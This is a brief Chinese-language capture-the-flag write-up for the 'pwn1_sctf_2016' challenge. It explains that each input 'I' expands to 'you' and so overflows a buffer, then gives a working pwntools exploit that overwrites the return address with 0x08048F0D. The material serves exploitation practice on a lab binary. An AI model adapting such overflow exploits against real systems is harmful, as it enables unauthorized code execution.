# pwn1_sctf_2016

## 程序分析

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-21_15-40-53.png)



**所以需要输入 20字符"I"替换为 "you",后满足 60字节长度，并突破输入长度的限制**



## Payload

```python
from pwn import *

io = process("/home/always/PWN/pwn1_sctf_2016")
#io = remote("node4.buuoj.cn",29876)

payload = flat(20*"I",4*"A",0x08048F0D)

io.sendline(payload)

io.interactive()
```

